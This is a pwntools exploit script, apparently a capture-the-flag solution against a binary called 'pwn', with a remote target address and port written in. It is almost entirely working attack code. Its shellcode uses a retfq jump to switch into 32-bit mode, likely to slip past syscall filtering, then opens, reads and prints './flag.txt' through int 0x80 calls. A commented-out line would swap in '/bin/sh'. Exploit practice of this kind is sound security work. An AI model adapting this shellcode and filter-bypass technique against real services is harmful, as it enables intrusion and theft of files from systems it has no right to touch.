# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.arch = "amd64"
context.terminal = ["/usr/bin/tmux","sp","-h"]
binary = 'pwn'
local = 1
if local == 1:
    #io=process(argv=['qemu-mipsel','-g','1234','-L','./','pwn'])
    io=process('./pwn')
else:
    io=remote('39.106.131.193',43268)
e=ELF(binary)

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

map_addr = int(ru('\n'),16)
lg('map_addr')

##sys_read_content
content='''
push 0x23;
push 0x100040;
/*mov rax,0x1000;
add [rsp],rax;*/
retfq;
'''
 
##sys_open_flag
sys_open='''
mov esp,0x100020;
mov ebx,0x100020;
xor ecx,ecx;
mov eax,0x5;
int 0x80;
'''

##sys_read(fd,0x100050,0x40)
syss_read='''
mov esp,0x100070;
mov ebx,eax;
mov ecx,0x100150;
mov edx,0x40;
mov eax,3;
int 0x80;
'''
 
##sys_write(1,0x100050,0x40)
sys_write='''
mov rbx,1;
mov eax,4;
int 0x80;
'''
content=asm(content)
content=content.ljust(0x20,'\x00')+'./flag.txt'.ljust(16,'\x00')
#content=content.ljust(0x20,'\x00')+'/bin/sh\x00'.ljust(16,'\x00')
content=content.ljust(0x40,'\x00')+asm(sys_open)
content=content.ljust(0x4d,'\x00')+asm(syss_read)+asm(sys_write)

#dbg()
pause()
sl(content)
irt()